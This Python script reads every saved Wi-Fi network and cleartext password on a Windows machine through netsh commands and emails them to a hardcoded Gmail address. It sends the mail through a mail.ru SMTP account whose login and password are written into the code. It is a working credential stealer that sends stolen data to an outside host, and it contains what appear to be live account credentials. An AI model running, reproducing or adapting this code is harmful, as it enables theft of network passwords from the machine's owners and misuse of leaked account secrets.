import os
from smtplib import SMTP_SSL as SMTP
from sys import argv

command1 = 'netsh wlan show profiles'
command2 = 'netsh wlan show profile name="{0}" key=clear'

DOMAIN = "smtp.mail.ru"
PORT = 465
LOGIN = "gggg-gggg-97@internet.ru"
PASSWORD = "8uk8eeykvdJBMkxFdQM1"
if len(argv) > 1:
    SEND_ADRESS = argv[1]
else:
    SEND_ADRESS = "sasha4ka99991@gmail.com"

letter = """\
From: {0}
To: {1}
Subject: Passwords
Content-Type: text/plain; charset="UTF-8";

Hello Sasha, This is new passwords:
{2}
"""

def get_wifi_passwords() -> dict: 
    passwords = {}
    stream = os.popen(command1)
    output = stream.readlines()
    for ssid in (line.split(':')[-1][1:-1] for line in output[9:-1]):
        stream = os.popen(command2.format(ssid))
        output = stream.readlines()
        if output[27].split(':')[-1][1:-1] == "Открыть":
            password = "[no password]"
        else:
            password = output[32].split(':')[-1][1:-1]
        passwords[ssid] = password
    return passwords

def get_passwords() -> dict:
    wifi_passwords = get_wifi_passwords()
    return wifi_passwords

def send_passwords(passwords: dict):
    body = "\n".join(f"{ssid}: {password}" for ssid, password in passwords.items())
    message = letter.format(LOGIN, SEND_ADRESS, body).encode("UTF-8")
    with SMTP(host=DOMAIN, port=PORT) as smtp:
        smtp.login(LOGIN, PASSWORD)
        smtp.sendmail(LOGIN, SEND_ADRESS, message)

def main():
    os.popen("chcp 1251")
    passwords = get_passwords()
    print(passwords)
    send_passwords(passwords)

if __name__ == "__main__":
    main()
